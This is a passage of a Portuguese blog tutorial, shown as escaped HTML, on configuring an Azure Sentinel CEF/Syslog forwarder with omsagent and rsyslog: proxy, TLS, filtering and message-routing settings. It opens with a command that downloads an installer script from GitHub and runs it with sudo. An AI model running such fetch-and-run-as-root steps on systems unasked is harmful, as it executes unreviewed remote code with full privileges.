&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python cef_installer.py &amp;lt;workspace &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &amp;lt;workspace secret&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Se seu forwarder necessita de um proxy para comunicar-se com a Internet, você precisará também atualizar tais configurações modificando o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/opt/microsoft/omsagent/proxy.conf&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;proxyconf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://user:password@proxyserver:3128&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#user:password can be ignored if you proxy doesn't require authentication&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$proxyconf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;/etc/opt/microsoft/omsagent/proxy.conf
&lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf

&lt;span class=&quot;c&quot;&gt;#restart service&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/microsoft/omsagent/bin/service_control restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Este script de instalação realiza as alterações listadas abaixo em seu sistema. A maioria delas necessita de conectividade com o Github uma vez que os assets utilizados estão armazenados no &lt;a href=&quot;https://github.com/Azure/Azure-Sentinel&quot;&gt;repositório oficial do Azure Sentinel&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Download e instalação do Microsoft Monitoring Agent para Linux.&lt;/li&gt;
  &lt;li&gt;Configuração do omsagent para ouvir na porta TCP/25226 e realizar o parsing das mensagens CEF a partir da cópia do arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security_events.conf&lt;/code&gt; dentro do diretório de configuração da workspace (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/opt/microsoft/omsagent/&amp;lt;workspaceID&amp;gt;/conf/omsagent.d&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;Encaminha as mensagens que contenham ASA ou CEF para a porta TCP/25226 a partir da cópia do arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/&lt;/code&gt; ou &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/syslog-ng/conf.d/&lt;/code&gt;, dependendo do seu serviço de syslog.&lt;/li&gt;
  &lt;li&gt;Habilita o serviço syslog para ouvir porta TCP/514 e UDP/514 a partir de edição do arquivo em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt; ou &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/syslog-ng/syslog-ng.conf&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Com esta configuração você já estará preparado para encaminhar as mensagens CEF para este servidor, que em breve estarão disponíveis na sua workspace de Log Analytics na tabela &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonSecurityLog&lt;/code&gt;, mas existem algumas outras alterações aqui descritas das quais poderá se beneficiar para coletar logs Syslog puro, assim como implementar filtros e ajustes na infraestrutura.&lt;/p&gt;

&lt;h2 id=&quot;configuração&quot;&gt;Configuração&lt;/h2&gt;

&lt;p&gt;Como vimos a infraestrutura é baseada no serviço de syslog + omsagent. Uma vez que o &lt;strong&gt;rsyslog&lt;/strong&gt; é um dos mais populares serviços utilizados e já disponível por padrão da maioria das distribuições atualmente, utilizarei todas as configurações aqui descritas para este serviço, embora você possa também ajustá-las para funcionamento com o syslog-ng caso necessário.&lt;/p&gt;

&lt;h3 id=&quot;validação-da-versão-e-instalação-do-rsyslog&quot;&gt;Validação da versão e instalação do rsyslog&lt;/h3&gt;

&lt;p&gt;Como mencionado em documentação, precisamos utilizar o rsyslog versão 8. Para confirmar a versão em execução em seu systema você pode executar o comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslogd -v&lt;/code&gt;, que exibirá um output como o exemplo abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsyslogd &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
rsyslogd 8.32.0, compiled with:
        PLATFORM:                               x86_64-pc-linux-gnu
        PLATFORM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        FEATURE_REGEXP:                         Yes
        GSSAPI Kerberos 5 support:              Yes
        FEATURE_DEBUG &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;debug build, slow code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: No
        32bit Atomic operations supported:      Yes
        64bit Atomic operations supported:      Yes
        memory allocator:                       system default
        Runtime Instrumentation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;slow code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:    No
        uuid support:                           Yes
        systemd support:                        Yes
        Number of Bits &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;RainerScript integers: 64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;De acordo com a &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/installation/index.html&quot;&gt;documentação do projeto&lt;/a&gt;, você não deve ter maiores problemas executando a versão do rsyslog disponível no repositório do mantenedor da distribuição a menos que eles não tenham portado alguma correção para ela. Neste caso você deverá baixar a última build para sua distribuição da página do projeto ou instalar a partir do código fonte.&lt;/p&gt;

&lt;h3 id=&quot;aplicando-as-configurações-do-rsyslog&quot;&gt;Aplicando as configurações do rsyslog&lt;/h3&gt;

&lt;p&gt;Após quaisquer alterações feitas no arquivo de configuração do rsyslog (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;) ou qualquer outro arquivo por ele importado (normalmente em &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/*.conf&lt;/code&gt;) você precisará reiniciar o serviço para que as alterações tenham efeito. Isso pode ser alcançado a partir da execução da linha de comando abaixo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart rsyslog.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;ajustando-os-listeners-do-rsyslog&quot;&gt;Ajustando os listeners do rsyslog&lt;/h3&gt;

&lt;p&gt;Embora o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cef_installer.py&lt;/code&gt; já defina os listeners para TCP/514 e UDP/514, talvez haja a necessidade de validar ou ajustar a sua configuração para criptografar a comunicação via TLS.&lt;/p&gt;

&lt;p&gt;Sua configuração atual deve se parecer com o trecho abaixo, que pode ser visto no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imuxsock&quot;) # provides support for local system logging&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#module(load=&quot;immark&quot;)  # provides --MARK-- message capability
&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# provides UDP syslog reception
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imudp&quot;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imudp&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;port=&quot;514&quot;) &lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# provides TCP syslog reception
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;port=&quot;514&quot;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A configuração para comunicação via TLS requer alguns itens adicionais, onde é necessário emitir os certificados para servidores e clientes (caso não esteja utilizando uma infra de PKI) assim como alterar o arquivo de configuração do rsyslog para aceitar estas comunicações.&lt;/p&gt;

&lt;p&gt;Maiores detalhes e exemplos de configurações podem ser encontrados na documentação oficial &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/tutorials/tls_cert_summary.html&quot;&gt;neste link&lt;/a&gt;, de onde retirei o trecho abaixo para que tenham uma ideia de como esta configuração se parece:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imuxsock&quot;) # local messages&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# TCP listener
&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;StreamDriver.Name=&quot;gtls&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;StreamDriver.Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# run driver in TLS-only mode
&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;StreamDriver.Authmode=&quot;anon&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# make gtls driver the default and set certificate files
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;global(&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gtls&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverCAFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/ca.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverCertFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/cert.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverKeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/key.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# start up listener at port 6514
&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6514&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;evitando-registro-de-eventos-remotos-em-arquivos-locais&quot;&gt;Evitando registro de eventos remotos em arquivos locais&lt;/h3&gt;

&lt;p&gt;Um ponto que é sempre questionado pelos clientes é que após configurar máquinas como forwarder para CEF e/ou Syslog os arquivos de log locais (frequentemente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/messages&lt;/code&gt; ou &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/syslog&lt;/code&gt;) são sobrecarregados com mensagens oriundas de servidores remotos, e na maioria das vezes consumindo todo o espaço em disco disponível do volume onde &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log&lt;/code&gt; reside.&lt;/p&gt;

&lt;p&gt;Isso ocorre porque as definições padrão do rsyslog, listadas abaixo, enviam alguns facilities e severidades para arquivos locais sem validar a fonte destes eventos (comentários e linhas em branco removidas por simplicidade).&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Nota&lt;/strong&gt;: O caminho onde encontrar estas configurações padrão variam de acordo com a distribuição Linux. Para Ubuntu existe um arquivo chamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/50-default.conf&lt;/code&gt; enquanto para distribuições baseadas em RHEL (RHEL, CentOS, Fedora) está na configuração principal do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#Extracted from Ubuntu /etc/rsyslog.d/50-default.conf
&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;auth,authpriv.*&lt;/span&gt;                 &lt;span class=&quot;err&quot;&gt;/var/log/auth.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*.*&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;auth,authpriv.none          -/var/log/syslog
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;kern.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/kern.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;mail.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/mail.log&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;mail.err&lt;/span&gt;                        &lt;span class=&quot;err&quot;&gt;/var/log/mail.err&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;*.emerg&lt;/span&gt;                         &lt;span class=&quot;err&quot;&gt;:omusrmsg:*&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Como podem ver, qualquer mensagem que coincida com alguma severidade contida nesta lista é enviada para um dos arquivos locais. Uma forma rápida de prevenir este comportamento é editar o arquivo de configuração para apenas aceitar mensagens geradas pelo host local (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;127.0.0.1&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;($&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;fromhost-ip&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;= '127.0.0.1') then {&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;auth,authpriv.*&lt;/span&gt;                 &lt;span class=&quot;err&quot;&gt;/var/log/auth.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;*.*&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;;auth,authpriv.none          -/var/log/syslog
&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;kern.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/kern.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;mail.*&lt;/span&gt;                          &lt;span class=&quot;err&quot;&gt;-/var/log/mail.log&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;mail.err&lt;/span&gt;                        &lt;span class=&quot;err&quot;&gt;/var/log/mail.err&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;*.emerg&lt;/span&gt;                         &lt;span class=&quot;err&quot;&gt;:omusrmsg:*&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;redução-de-mensagens-repetidas&quot;&gt;Redução de mensagens repetidas&lt;/h3&gt;

&lt;p&gt;Conforme lembrado pelo meu colega &lt;a href=&quot;https://www.linkedin.com/in/flavio-honda/&quot;&gt;Flavio Honda&lt;/a&gt;, o Rsyslog possui uma opção que pode auxiliar com a redução de mensagens repetidas.&lt;/p&gt;

&lt;p&gt;Se você sofre com este tipo de problema ou quer prevenir antes mesmo que venha acontecer em seu ambiente, você pode habilitar a configuração abaixo no seu arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt; :smile:.&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$RepeatedMsgReduction&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;on&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A referência oficial sobre esta feature na documentação do RSyslog pode ser encontrada &lt;a href=&quot;https://www.rsyslog.com/doc/master/configuration/action/rsconf1_repeatedmsgreduction.html&quot;&gt;neste link&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;fluxo-de-processamento-de-mensagens&quot;&gt;Fluxo de processamento de mensagens&lt;/h3&gt;

&lt;p&gt;No rsyslog, o primeiro arquivo a ser processado é o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslog.conf&lt;/code&gt;, que normalmente contém uma instrução para importar todos os arquivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.conf&lt;/code&gt; localizados no diretório &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d&lt;/code&gt; e os arquivos são processados em ordem &lt;strong&gt;alfabética&lt;/strong&gt;. Quando uma mensagem chega ou é gerada no sistema, é encaminhada e avaliada por cada uma das configurações nesta mesma ordem, a menos que alteremos explicitamente este comportamento.&lt;/p&gt;

&lt;p&gt;Na configuração abaixo, vamos considerar que estamos encaminhando mensagens no formato CEF de um appliance que são enviadas com o facility &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local4.info&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/IFykwc2.png&quot; alt=&quot;processing - initial configuration&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Se nenhuma alteração for realizada no &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslog.conf&lt;/code&gt; ou &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;50-default.conf&lt;/code&gt; para prevenir o registro de mensagens de um host remoto, estas mensagens serão registradas no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/syslog&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;Também, se houver algum match no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; esta mensagem será enviada para a workspace de Log Analytics como Syslog puro.&lt;/li&gt;
  &lt;li&gt;E por fim, ele coincidirá com as regular expressions contidas no arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; e tratado como mensagem CEF para a tabela &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonSecurityLog&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Isso não apenas resultará no disco cheio, mas também em cobrança duplicada para este mesmo evento, que será armazenado duas vezes no Log Analytics.&lt;/p&gt;

&lt;p&gt;Para evitar este comportamento, como Ofer Shezaf compartilhou em um dos &lt;a href=&quot;https://aka.ms/securitywebinars&quot;&gt;Webinars da Comunidade de Segurança&lt;/a&gt; (&lt;em&gt;Log Forwarder deep dive | Filtering CEF and Syslog events&lt;/em&gt;), vamos renomear o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; para &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;60-cef.conf&lt;/code&gt; de forma que ele seja processado &lt;strong&gt;antes&lt;/strong&gt; do &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Adicionalmente, precisamos garantir que uma vez que as mensagens sejam encaminhadas para o TCP/25226 e tratadas como CEF sejam descartadas, o que é alcançado pelo uso da instrução &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;stop&lt;/code&gt;. O &lt;strong&gt;Stop&lt;/strong&gt; remove as mensagens do processamento do rsyslog.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Nota&lt;/strong&gt;: Você poderá encontrar outras instruções que utilizem o stop como um til (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~&lt;/code&gt;). Esta notação veio da syntax legado do syslogd&lt;/p&gt;

&lt;p&gt;Esta configuração ficaria da seguinte forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/rsyslog.d/60-cef.conf
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawmsg&lt;/span&gt; contains &lt;span class=&quot;s2&quot;&gt;&quot;CEF:&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; or &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rawmsg&lt;/span&gt; contains &lt;span class=&quot;s2&quot;&gt;&quot;ASA-&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;.&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;     @@127.0.0.1:25226
        stop
&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/cPteGGK.png&quot; alt=&quot;processing - reordering&quot; style=&quot;zoom:80%;&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;ajustando-o-95-omsagentconf&quot;&gt;Ajustando o &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt;&lt;/h3&gt;

&lt;p&gt;Após a instalação inicial, o agente do MMA criará um arquivo de configuração no diretório do serviço syslog (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/95-omsagent.conf&lt;/code&gt;) em sincronismo com as configurações definidas no portal do Azure, navegando em sua workspace de Log Analytics &amp;gt; Agents Configuration &amp;gt; Syslog:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/UesHmCS.png&quot; alt=&quot;Log Analytics Agent Configurations - Syslog&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para a configuração acima o seguinte conteúdo será criado no arquivo, conforme abaixo:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# OMS Syslog collection for workspace &amp;lt;workspace id&amp;gt;
&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;auth.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;auth.=crit;auth.=debug;auth.=emerg;auth.=err;auth.=info;auth.=notice;auth.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;authpriv.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;authpriv.=crit;authpriv.=debug;authpriv.=emerg;authpriv.=err;authpriv.=info;authpriv.=notice;authpriv.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;local3.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;local3.=crit;local3.=debug;local3.=emerg;local3.=err;local3.=info;local3.=notice;local3.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;span class=&quot;py&quot;&gt;local4.&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;alert;local4.=crit;local4.=debug;local4.=emerg;local4.=err;local4.=info;local4.=notice;local4.=warning  @127.0.0.1:25224&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Mesmo que esta configuração seja extremamente simples de se fazer pelo portal, ela se aplica globalmente a todos os dispositivos Linux que possuem o omsagent conectado a esta workspace, ingerindo mais informação de que precisa dentro de sua workspace de Log Analytics se mais tipos de dados são selecionados que o necessário.&lt;/p&gt;

&lt;p&gt;Se precisa definir uma configuração diferente para algumas máquinas como os seus forwarders, é recomendado que se edite diretamente o arquivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;95-omsagent.conf&lt;/code&gt; adicionando ou removendo facilities e severidades dele, assim como construindo suas condições para que estes dados sejam enviados ao Azure mas precisamos impedir que este arquivo seja sincronizado com as definições no portal.&lt;/p&gt;

&lt;p&gt;O comando abaixo “quebra” o vínculo existente entre este arquivo e a configuração da workspace:&lt;/p&gt;

